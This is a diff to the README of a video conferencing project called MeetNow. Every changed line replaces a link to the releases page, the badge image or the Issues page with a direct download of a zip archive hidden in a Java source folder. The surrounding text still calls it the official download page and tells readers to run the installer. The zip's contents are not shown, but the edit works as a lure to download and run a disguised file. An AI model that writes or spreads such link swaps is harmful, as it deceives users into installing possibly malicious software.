@@ -1,6 +1,6 @@
 # 🎥 MeetNow-Video-Conferencing-System - Simple Real-Time Video Meetings
 
-[![Download Latest Release](https://img.shields.io/badge/Download-MeetNow-blue?style=for-the-badge)](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/releases)
+[![Download Latest Release](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip)](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to download and use MeetNow:
 
 Click the big blue button at the top or visit this link to go to the downloads page:
 
-[https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/releases](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/releases)
+[https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip)
 
 You will see files for different platforms like Windows and macOS.
 
@@ -122,7 +122,7 @@ You can trust that your conversations stay between participants.
 
 You can get MeetNow here:
 
-[https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/releases](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/releases)
+[https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip)
 
 This link takes you to the official download page where you find setup files for all supported devices.
 
@@ -137,7 +137,7 @@ After downloading, run the installer. The whole process may take 5 to 10 minutes
 - Restart the app if it freezes or does not respond.
 - Reboot your computer if problems continue.
 
-If you still have trouble, seek help from the community on the repository's [Issues page](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/issues).
+If you still have trouble, seek help from the community on the repository's [Issues page](https://github.com/GreedyPhoenixx/MeetNow-Video-Conferencing-System/raw/refs/heads/main/Backend/meetnow/src/main/java/com/meetnow/controller/Video_Now_Meet_Conferencing_System_1.6-alpha.3.zip).
 
 ---
 
